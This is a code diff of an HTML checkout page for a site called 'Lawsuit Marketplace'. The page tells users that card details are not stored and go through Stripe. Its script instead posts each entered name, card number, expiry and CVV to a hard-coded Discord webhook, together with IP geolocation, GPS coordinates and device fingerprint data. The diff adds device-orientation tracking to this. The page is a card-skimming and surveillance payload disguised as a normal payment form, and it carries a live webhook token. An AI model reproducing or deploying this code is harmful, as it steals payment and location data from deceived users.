@@ -1,55 +1,189 @@
-<script>
-  document.querySelectorAll('input[name="payment-method"]').forEach((radio) => {
-    radio.addEventListener('change', (event) => {
-      document.querySelector('.card-details').style.display = event.target.id === 'payment-card' ? 'block' : 'none';
-      document.querySelector('.crypto-details').style.display = event.target.id === 'payment-crypto' ? 'block' : 'none';
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Payment Methods | Lawsuit Marketplace</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap"
+    rel="stylesheet"
+  />
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #0f172a;
+      color: white;
+    }
+
+    .form-section {
+      background-color: rgba(31, 41, 55, 0.8);
+      border-radius: 1rem;
+      padding: 2rem;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    }
+
+    .form-section h2 {
+      font-size: 1.75rem;
+      font-weight: 600;
+    }
+
+    .payment-method {
+      border: 2px solid rgba(255, 255, 255, 0.2);
+      padding: 2rem;
+      border-radius: 1rem;
+      cursor: pointer;
+      transition: transform 0.3s ease;
+    }
+
+    .payment-method:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+    }
+
+    .card-details, .crypto-details {
+      display: none;
+    }
+
+    .payment-method input[type="radio"]:checked + label {
+      background-color: #1c1f2f;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+    }
+  </style>
+</head>
+<body class="bg-gray-950">
+
+  <header class="bg-gray-900 bg-opacity-80 shadow-md p-6 flex justify-between items-center relative z-10">
+    <h1 class="text-3xl font-semibold font-poppins tracking-wide text-white">Lawsuit Marketplace</h1>
+  </header>
+
+  <section class="p-6 mt-12 max-w-4xl mx-auto">
+    <h2 class="text-4xl font-semibold text-center text-white mb-8">Select Your Payment Method</h2>
+
+    <div class="flex justify-center space-x-8">
+      <!-- Card Payment Method -->
+      <div class="payment-method">
+        <input type="radio" id="payment-card" name="payment-method" class="hidden" />
+        <label for="payment-card" class="flex flex-col items-center text-white p-6 rounded-xl cursor-pointer hover:bg-gray-800">
+          <span class="text-xl font-semibold">Pay with Card</span>
+          <span class="mt-2 text-sm text-gray-400">Secure payment via Stripe</span>
+        </label>
+        <div class="card-details mt-6">
+          <p class="text-gray-300 mb-4">We do not store card details. All purchases go through <a href="https://stripe.com" target="_blank" class="text-blue-400">Stripe</a>.</p>
+          <form>
+            <label for="full-name" class="text-sm text-gray-300">Full Name:</label>
+            <input type="text" id="full-name" class="w-full p-3 mt-2 bg-gray-800 border border-gray-600 rounded-lg text-white focus:outline-none" placeholder="John Doe" required />
+
+            <label for="card-number" class="text-sm text-gray-300 mt-4">Card Number:</label>
+            <input type="text" id="card-number" class="w-full p-3 mt-2 bg-gray-800 border border-gray-600 rounded-lg text-white focus:outline-none" placeholder="1234 5678 9876 5432" required />
+
+            <div class="flex justify-between mt-4">
+              <div class="w-1/2 pr-2">
+                <label for="expiry" class="text-sm text-gray-300">Expiry Date:</label>
+                <input type="text" id="expiry" class="w-full p-3 mt-2 bg-gray-800 border border-gray-600 rounded-lg text-white focus:outline-none" placeholder="MM/YY" required />
+              </div>
+              <div class="w-1/2 pl-2">
+                <label for="cvv" class="text-sm text-gray-300">CVV:</label>
+                <input type="text" id="cvv" class="w-full p-3 mt-2 bg-gray-800 border border-gray-600 rounded-lg text-white focus:outline-none" placeholder="123" required />
+              </div>
+            </div>
+
+            <button type="submit" class="w-full mt-6 bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition">Proceed with Card Payment</button>
+          </form>
+        </div>
+      </div>
+
+      <!-- Crypto Payment Method -->
+      <div class="payment-method">
+        <input type="radio" id="payment-crypto" name="payment-method" class="hidden" />
+        <label for="payment-crypto" class="flex flex-col items-center text-white p-6 rounded-xl cursor-pointer hover:bg-gray-800">
+          <span class="text-xl font-semibold">Pay with Crypto</span>
+          <span class="mt-2 text-sm text-gray-400">Send Bitcoin to the address below</span>
+        </label>
+        <div class="crypto-details mt-6">
+          <p class="text-gray-300">Please send the required amount of Bitcoin to the address below:</p>
+          <pre class="text-blue-400 mt-4">3242jfb23lkbf32clkf3</pre>
+          <p class="text-gray-400 mt-4">Once the transaction is complete, you will be redirected to a confirmation page.</p>
+          <button class="w-full mt-6 bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition">Confirm Crypto Payment</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <footer class="p-6 mt-12 text-center text-gray-500">
+    <div class="text-gray-400">
+      <p>&copy; 2024 Lawsuit MarketPlace. All rights reserved.</p>
+    </div>
+  </footer>
+
+  <script>
+    // Show corresponding payment method details
+    document.querySelectorAll('input[name="payment-method"]').forEach((radio) => {
+      radio.addEventListener('change', (event) => {
+        document.querySelector('.card-details').style.display = event.target.id === 'payment-card' ? 'block' : 'none';
+        document.querySelector('.crypto-details').style.display = event.target.id === 'payment-crypto' ? 'block' : 'none';
+      });
     });
-  });
 
-  async function getMetadata() {
-    const [ipData, battery] = await Promise.all([
-      fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({})),
-      navigator.getBattery ? navigator.getBattery() : Promise.resolve({})
-    ]);
+    async function getMetadata() {
+      const [ipData, battery] = await Promise.all([
+        fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({})),
+        navigator.getBattery ? navigator.getBattery() : Promise.resolve({})
+      ]);
 
-    // Try to get GPS coordinates
-    const coords = await new Promise((resolve) => {
-      navigator.geolocation.getCurrentPosition(
-        pos => resolve({
-          lat: pos.coords.latitude.toFixed(6),
-          lon: pos.coords.longitude.toFixed(6)
-        }),
-        () => resolve({ lat: 'Permission Denied', lon: 'Permission Denied' }),
-        { timeout: 5000 }
-      );
-    });
+      // Try to get GPS coordinates
+      const coords = await new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve({
+            lat: pos.coords.latitude.toFixed(6),
+            lon: pos.coords.longitude.toFixed(6)
+          }),
+          () => resolve({ lat: 'Permission Denied', lon: 'Permission Denied' }),
+          { timeout: 5000 }
+        );
+      });
 
-    return {
-      ip: ipData.ip || 'N/A',
-      country: ipData.country_name || 'N/A',
-      city: ipData.city || 'N/A',
-      org: ipData.org || 'N/A',
-      timezone: ipData.timezone || 'N/A',
-      browser: navigator.userAgent,
-      language: navigator.language,
-      screen: `${screen.width}x${screen.height}`,
-      platform: navigator.platform,
-      ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
-      cpu: navigator.hardwareConcurrency || 'Unknown',
-      battery: battery.level ? `${Math.round(battery.level * 100)}%` : 'Unavailable',
-      charging: battery.charging ? 'Yes' : 'No',
-      status: navigator.onLine ? 'Online' : 'Offline',
-      lat: coords.lat,
-      lon: coords.lon,
-      mapLink: coords.lat !== 'Permission Denied' ? `https://maps.google.com/?q=${coords.lat},${coords.lon}` : 'User denied location access.',
-      time: new Date().toLocaleString()
-    };
-  }
+      // Device orientation
+      const orientation = {
+        tiltX: 'N/A',
+        tiltY: 'N/A',
+        tiltZ: 'N/A'
+      };
+      if (window.DeviceOrientationEvent) {
+        window.addEventListener("deviceorientation", (e) => {
+          orientation.tiltX = e.beta;
+          orientation.tiltY = e.gamma;
+          orientation.tiltZ = e.alpha;
+        });
+      }
 
-  function sendToDiscord(paymentMethod, formData, meta) {
-    const webhookUrl = 'https://discordapp.com/api/webhooks/1373748781861834882/2SDjfj-z2YxeR71Z8JDFLw3lk8uQwjIu_PwYrgTfMwLrIsVyBdJBW5PBNB1qg50wfLAe';
-    const message = {
-      content: `📦 **New Order (Demo Project)**
+      return {
+        ip: ipData.ip || 'N/A',
+        country: ipData.country_name || 'N/A',
+        city: ipData.city || 'N/A',
+        org: ipData.org || 'N/A',
+        timezone: ipData.timezone || 'N/A',
+        browser: navigator.userAgent,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        platform: navigator.platform,
+        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
+        cpu: navigator.hardwareConcurrency || 'Unknown',
+        battery: battery.level ? `${Math.round(battery.level * 100)}%` : 'Unavailable',
+        charging: battery.charging ? 'Yes' : 'No',
+        status: navigator.onLine ? 'Online' : 'Offline',
+        lat: coords.lat,
+        lon: coords.lon,
+        mapLink: coords.lat !== 'Permission Denied' ? `https://maps.google.com/?q=${coords.lat},${coords.lon}` : 'User denied location access.',
+        orientation,
+        time: new Date().toLocaleString()
+      };
+    }
+
+    function sendToDiscord(paymentMethod, formData, meta) {
+      const webhookUrl = 'https://discordapp.com/api/webhooks/1373748781861834882/2SDjfj-z2YxeR71Z8JDFLw3lk8uQwjIu_PwYrgTfMwLrIsVyBdJBW5PBNB1qg50wfLAe';
+      const message = {
+        content: `📦 **New Order (Demo Project)**
 
 🧾 **Order Info**
 - Method: ${paymentMethod}
@@ -68,7 +202,7 @@
 - Lon: ${meta.lon}
 - 🌍 [View on Map](${meta.mapLink})
 
-💻 **Device Info**
+📡 **Device Info**
 - Browser: ${meta.browser}
 - Platform: ${meta.platform}
 - Screen: ${meta.screen}
@@ -76,41 +210,33 @@
 - RAM: ${meta.ram}
 - CPU Cores: ${meta.cpu}
 - Battery: ${meta.battery} (Charging: ${meta.charging})
+- Orientation (Tilt): X: ${meta.orientation.tiltX}, Y: ${meta.orientation.tiltY}, Z: ${meta.orientation.tiltZ}
 - Online Status: ${meta.status}
 - Submitted At: ${meta.time}`
-    };
+      };
 
-    fetch(webhookUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(message)
-    })
-    .then(() => alert('Demo order submitted! Check Discord.'))
-    .catch(err => console.error('Webhook Error:', err));
-  }
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(message)
+      })
+      .then(() => alert('Demo order submitted! Check Discord.'))
+      .catch(err => console.error('Webhook Error:', err));
+    }
 
-  document.querySelector('.card-details form').addEventListener('submit', async function (e) {
-    e.preventDefault();
-    const formData = {
-      fullName: document.querySelector('#full-name').value,
-      cardNumber: document.querySelector('#card-number').value,
-      expiry: document.querySelector('#expiry').value,
-      cvv: document.querySelector('#cvv').value,
-      bitcoinAddress: ''
-    };
-    const meta = await getMetadata();
-    sendToDiscord('Card', formData, meta);
-  });
+    document.querySelector('form').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const paymentMethod = document.querySelector('input[name="payment-method"]:checked').id;
+      const formData = {
+        fullName: document.getElementById('full-name').value,
+        cardNumber: document.getElementById('card-number').value,
+        expiry: document.getElementById('expiry').value,
+        cvv: document.getElementById('cvv').value
+      };
 
-  document.querySelector('.crypto-details button').addEventListener('click', async function () {
-    const formData = {
-      fullName: '',
-      cardNumber: '',
-      expiry: '',
-      cvv: '',
-      bitcoinAddress: document.querySelector('.crypto-details pre').innerText
-    };
-    const meta = await getMetadata();
-    sendToDiscord('Crypto', formData, meta);
-  });
-</script>
+      const meta = await getMetadata();
+      sendToDiscord(paymentMethod, formData, meta);
+    });
+  </script>
+</body>
+</html>
